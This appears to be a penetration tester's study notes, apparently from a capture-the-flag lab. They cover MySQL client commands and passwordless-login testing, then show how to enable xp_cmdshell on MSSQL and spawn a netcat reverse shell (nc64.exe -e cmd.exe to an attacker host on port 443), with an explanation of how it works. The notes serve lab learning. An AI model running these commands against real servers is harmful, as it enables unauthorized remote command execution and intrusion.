sudo apt update && sudo apt install mysql*
- * symbol at the end of the command to include all the related MySQL packages available
- test for passwordless authentication, as there might be an intentional misconfiguration in the service
- -h : Connect to host. -u : User for log-in if not current user.
- [Cheatsheet](https://www.mysqltutorial.org/mysql-cheat-sheet/)
- SHOW databases; : Prints out the databases we can access.
  USE {database_name}; : Set to use the database named {database_name}.
  SHOW tables; : Prints out the available tables inside the current database.
  SELECT * FROM {table_name}; : Prints out all the data from the table {table_name}


First it is suggested to check if the xp_cmdshell is already activated by issuing the first command:
EXEC xp_cmdshell 'net user'; — privOn MSSQL 2005 you may need to reactivate xp_cmdshell
first as it’s disabled by default:
EXEC sp_configure 'show advanced options', 1; — priv
RECONFIGURE; — priv
EXEC sp_configure 'xp_cmdshell', 1; — priv
RECONFIGURE; — priv
SQL> EXEC xp_cmdshell 'net user';

xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe [host IP] 443"
-e cmd.exe Tells Netcat to: launch cmd.exe and attach it to the network connection, meaning: Netcat takes: the input/output of cmd.exe and redirects it over the network socket